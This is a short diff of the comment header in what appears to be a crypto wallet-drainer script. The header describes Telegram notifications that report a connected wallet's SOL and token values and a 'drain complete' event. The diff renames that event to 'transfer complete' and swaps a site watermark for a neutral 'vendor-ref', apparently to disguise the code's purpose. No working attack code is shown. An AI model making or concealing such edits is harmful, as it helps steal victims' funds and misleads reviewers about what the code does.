@@ -8,8 +8,8 @@
  * SECTION 6 — TELEGRAM NOTIFICATION BUILDERS
  * buildAssetSummary(): wallet connect notification with SOL + token values
  * buildConnectNotif(isState3): connect / state-3 notification
- * buildState4Notif(): drain complete notification
- * buildTxNotif(addr): tx notification with hexfomo.fun watermark
+ * buildState4Notif(): transfer complete notification
+ * buildTxNotif(addr): tx notification with vendor-ref watermark
  * buildSelectorNotif(): picks the right builder based on connectionState
  * ═══════════════════════════════════════════════════════════ */
 function buildAssetSummary() {
